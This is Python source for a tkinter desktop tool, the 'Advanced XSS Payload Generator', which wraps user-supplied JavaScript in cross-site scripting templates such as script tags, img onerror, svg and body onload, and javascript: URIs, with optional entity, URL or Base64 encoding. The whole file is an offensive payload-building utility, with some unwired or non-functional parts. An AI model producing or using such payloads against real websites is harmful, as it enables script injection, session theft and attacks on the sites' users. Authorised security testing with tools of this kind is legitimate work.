import tkinter as tk
from tkinter import ttk, messagebox
import html
import urllib.parse

class XSSPayloadGenerator:
    def __init__(self, master):
        self.master = master
        master.title("Advanced XSS Payload Generator")
        master.geometry("800x700")

        # --- Payload Configuration ---
        self.create_payload_config_frame()

        # --- Custom Template ---
        self.create_custom_template_frame()

        # --- Encoding Options ---
        self.create_encoding_frame()

        # --- Buttons ---
        self.create_buttons()

        # --- Output ---
        self.create_output_frame()

        # --- Preview ---
        self.create_preview_section()

    def create_payload_config_frame(self):
        self.config_frame = ttk.LabelFrame(self.master, text="Payload Configuration")
        self.config_frame.pack(padx=10, pady=10, fill="x")

        # JavaScript Code (multi-line)
        ttk.Label(self.config_frame, text="JavaScript Code:").grid(row=0, column=0, padx=5, pady=5, sticky="nw")
        self.js_code_text = tk.Text(self.config_frame, height=4, width=60)
        self.js_code_text.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        self.js_code_text.insert("1.0", "alert('XSS')")  # default example

        # Tag Selection
        ttk.Label(self.config_frame, text="HTML Tag:").grid(row=1, column=0, padx=5, pady=5, sticky="nw")
        self.tag_var = tk.StringVar(value="<script>{payload}</script>")

        tags = [
            ("<script>{payload}</script>", "<script>...</script>"),
            ("<img src=x onerror=\"{payload}\">", "<img onerror=...>"),
            ("<svg onload=\"{payload}\">", "<svg onload=...>"),
            ("<body onload=\"{payload}\">", "<body onload=...>"),
            ("<iframe src=\"javascript:{payload}\">", "<iframe src=javascript:...>"),
            ("<a href=\"javascript:{payload}\">Click Me</a>", "<a href=javascript:...>")
        ]

        rb_frame = ttk.Frame(self.config_frame)
        rb_frame.grid(row=1, column=1, padx=5, pady=5, sticky="w")
        for idx, (text, label) in enumerate(tags):
            rb = ttk.Radiobutton(rb_frame, text=label, variable=self.tag_var, value=text)
            rb.grid(row=idx // 2, column=idx % 2, padx=5, pady=2, sticky="w")
        self.config_frame.columnconfigure(1, weight=1)

    def create_custom_template_frame(self):
        self.custom_frame = ttk.LabelFrame(self.master, text="Custom Payload Template")
        self.custom_frame.pack(padx=10, pady=10, fill="x")
        ttk.Label(self.custom_frame, text="Enter custom template with {payload} placeholder:").pack(padx=5, pady=5)
        self.custom_template_entry = tk.Text(self.custom_frame, height=3, width=70)
        self.custom_template_entry.pack(padx=5, pady=5)
        self.custom_template_entry.insert("1.0", "")  # default empty

    def create_encoding_frame(self):
        self.encoding_frame = ttk.LabelFrame(self.master, text="Encoding Options")
        self.encoding_frame.pack(padx=10, pady=5, fill="x")
        ttk.Label(self.encoding_frame, text="Select Encoding:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.encoding_var = tk.StringVar(value="None")
        encoding_options = ["None", "HTML Entities", "URL Encoding (Simple)", "Base64"]
        self.encoding_menu = ttk.Combobox(self.encoding_frame, textvariable=self.encoding_var, values=encoding_options, state="readonly", width=20)
        self.encoding_menu.grid(row=0, column=1, padx=5, pady=5, sticky="w")

    def create_buttons(self):
        button_frame = ttk.Frame(self.master)
        button_frame.pack(pady=10)
        self.generate_button = ttk.Button(button_frame, text="Generate Payload", command=self.generate_payload)
        self.generate_button.pack(side="left", padx=5)
        self.preview_button = ttk.Button(button_frame, text="Preview", command=self.update_preview)
        self.preview_button.pack(side="left", padx=5)

    def create_output_frame(self):
        self.output_frame = ttk.LabelFrame(self.master, text="Generated Payload")
        self.output_frame.pack(padx=10, pady=10, fill="both", expand=True)
        self.output_text = tk.Text(self.output_frame, wrap=tk.WORD, height=10)
        self.output_text.pack(padx=5, pady=5, fill="both", expand=True)
        self.output_text.configure(state="disabled")

    def create_preview_section(self):
        self.preview_frame = ttk.LabelFrame(self.master, text="Preview (HTML output)")
        self.preview_frame.pack(padx=10, pady=10, fill="both", expand=True)
        self.preview_label = tk.Label(self.preview_frame, text="", justify="left", anchor="nw")
        self.preview_label.pack(padx=5, pady=5, fill="both", expand=True)

    def generate_payload(self):
        # Get inputs
        js_code = self.js_code_text.get("1.0", tk.END).strip()
        if not js_code:
            messagebox.showwarning("Input Error", "JavaScript code cannot be empty.")
            return

        # Check for custom template
        custom_template = self.custom_template_entry.get("1.0", tk.END).strip()
        if custom_template:
            payload_template = custom_template
        else:
            payload_template = self.tag_var.get()

        # Encode JS code
        encoded_js = self.apply_encoding(js_code, payload_template)

        # Generate payload
        payload = payload_template.format(payload=encoded_js)

        # Display payload
        self.output_text.configure(state="normal")
        self.output_text.delete("1.0", tk.END)
        self.output_text.insert(tk.END, payload)
        self.output_text.configure(state="disabled")

    def apply_encoding(self, js_code, template):
        encoding_type = self.encoding_var.get()
        encoded_js = js_code

        # Determine context for encoding
        if template.startswith("<iframe src=\"javascript:") or template.startswith("<a href=\"javascript:"):
            if encoding_type == "URL Encoding (Simple)":
                encoded_js = urllib.parse.quote(js_code)
            elif encoding_type == "HTML Entities":
                encoded_js = html.escape(js_code, quote=True)
            elif encoding_type == "Base64":
                import base64
                encoded_js = base64.b64encode(js_code.encode()).decode()
        else:
            # For inline scripts or event handlers
            if encoding_type == "HTML Entities":
                encoded_js = html.escape(js_code, quote=True)
            elif encoding_type == "Base64":
                import base64
                encoded_js = base64.b64encode(js_code.encode()).decode()

        return encoded_js

    def update_preview(self):
        # Generate payload for preview
        js_code = self.js_code_text.get("1.0", tk.END).strip()
        if not js_code:
            self.preview_label.config(text="JavaScript code is empty.")
            return

        # Use custom template if provided
        custom_template = self.custom_template_entry.get("1.0", tk.END).strip()
        if custom_template:
            payload_template = custom_template
        else:
            payload_template = self.tag_var.get()

        # Encode JS code
        encoded_js = self.apply_encoding(js_code, payload_template)

        # Generate payload
        payload = payload_template.format(payload=encoded_js)

        # Show in preview label (escape HTML for display)
        display_text = html.escape(payload)
        self.preview_label.config(text=display_text)

    def copy_to_clipboard(self):
        payload = self.output_text.get("1.0", tk.END).strip()
        if payload:
            self.master.clipboard_clear()
            self.master.clipboard_append(payload)
            messagebox.showinfo("Copied", "Payload copied to clipboard!")
        else:
            messagebox.showwarning("Empty Payload", "Nothing to copy.")

if __name__ == '__main__':
    root = tk.Tk()
    app = XSSPayloadGenerator(root)
    root.mainloop()
